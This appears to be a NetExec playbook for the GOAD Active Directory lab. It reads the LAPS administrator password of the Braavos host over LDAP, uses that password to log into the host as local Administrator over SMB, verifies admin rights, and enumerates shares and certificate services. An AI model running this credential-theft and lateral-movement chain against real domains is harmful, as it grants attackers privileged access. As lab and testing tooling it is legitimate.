"""Read Braavos LAPS through Meereen, authenticate locally, and verify admin.

Start on 10.60.0.12 and allow 10.60.0.23. Jorah is a configured LAPS reader.
Legacy LAPS has no account-name field; this lab uses the built-in Administrator.
No password rotation, service creation, or directory changes are performed.
"""

from dataclasses import dataclass, field

from nxc.playbooks.results import ActionResult, CredentialRef, ResultStatus


@dataclass
class LAPSPathEvidence:
    reader_credential: CredentialRef | None = None
    local_credential: CredentialRef | None = None
    computer: str | None = None
    password_source: str | None = None
    local_username: str | None = None
    authenticated: bool = False
    admin_privileges: bool | None = None
    reference_authenticated: bool = False
    reference_admin_privileges: bool | None = None
    published_ca_services: list[dict] = field(default_factory=list)
    adcs_rpc_observed: bool | None = None
    evidence_indices: list[int] = field(default_factory=list)
    reached: bool = False
    reason: str | None = None


def run(host):
    if host.target != "10.60.0.12":
        raise ValueError("Start this GOAD LAPS path on Meereen at 10.60.0.12")
    braavos = host.at("10.60.0.23")
    data = LAPSPathEvidence()

    def finish(reason=None):
        data.reason = reason
        host.record(ActionResult("playbook", "goad_laps_path", host.target, ResultStatus.SUCCESS if data.reached else ResultStatus.NEGATIVE, data, inputs={"destination": braavos.target, "legacy_laps_username": "Administrator"}))

    ldap = host.ldap()
    data.evidence_indices.append(len(host.run.results) - 1)
    if not ldap.ok or not ldap.result.data.authenticated:
        finish("Directory reader authentication was not established")
        return
    data.reader_credential = ldap.result.data.credential
    passwords = ldap.module("laps", computer="BRAAVOS")
    data.evidence_indices.append(len(host.run.results) - 1)
    records = [record for record in passwords.data.computers if (record.computer or "").upper() == "BRAAVOS$" and record.password is not None]
    if len(records) != 1:
        finish("Exactly one readable Braavos LAPS password was not returned")
        return
    password = records[0]
    data.computer, data.password_source = password.computer, password.source
    data.local_username = password.username or "Administrator"
    cas = ldap.module("adcs")
    data.evidence_indices.append(len(host.run.results) - 1)
    data.published_ca_services = [service for service in cas.data.services if password.dns_hostname and str(service["attributes"].get("dNSHostName", "")).casefold() == password.dns_hostname.casefold()]
    smb = braavos.smb(username=data.local_username, password=password.password, local_auth=True)
    data.evidence_indices.append(len(host.run.results) - 1)
    data.authenticated = smb.ok and smb.result.data.authenticated
    if not data.authenticated:
        finish("Retrieved LAPS password did not establish a local SMB login")
        return
    data.admin_privileges = smb.result.data.admin_privileges
    data.local_credential = smb.result.data.credential
    if data.local_credential is None:
        raise ValueError("Successful LAPS login has no stored credential reference")
    reused = braavos.smb(credential=data.local_credential, local_auth=True)
    data.evidence_indices.append(len(host.run.results) - 1)
    data.reference_authenticated = reused.ok and reused.result.data.authenticated
    if data.reference_authenticated:
        data.reference_admin_privileges = reused.result.data.admin_privileges
        reused.shares()
        data.evidence_indices.append(len(host.run.results) - 1)
        ca = reused.module("enum_ca", stop_on_error=False)
        data.evidence_indices.append(len(host.run.results) - 1)
        if ca.status in (ResultStatus.SUCCESS, ResultStatus.NEGATIVE):
            data.adcs_rpc_observed = ca.data.adcs_found
        if braavos.smb(credential=data.local_credential, local_auth=True) is not reused:
            raise ValueError("Stored-credential SMB session was not reused")
    data.reached = data.reference_authenticated and data.reference_admin_privileges is True
    finish(None if data.reached else "NetExec's SMB admin check was not successful with the stored credential")
